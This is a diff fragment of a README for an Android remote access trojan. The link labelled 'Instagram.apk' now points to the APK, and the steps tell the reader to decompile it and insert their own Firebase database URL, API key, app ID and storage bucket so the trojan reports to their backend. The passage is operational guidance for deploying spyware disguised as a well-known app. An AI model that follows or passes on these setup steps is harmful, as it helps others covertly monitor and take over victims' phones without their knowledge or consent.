@@ -5,7 +5,7 @@ Don't forget to add firebase url in ```classes3.dex``` search for ```databaseURL
 https://user-images.githubusercontent.com/112254347/188288155-6d843d58-443a-4cc7-9306-83869c42b076.mp4
 
 ### Android RAT
- 1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
+ 1. Download [Instagram.apk](./ANDROID%20APP/AndroidApp.apk)
  1. Decompile it using any Decompiler recommend above.
  1. Now open `res/values/strings.xml` file.
  1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
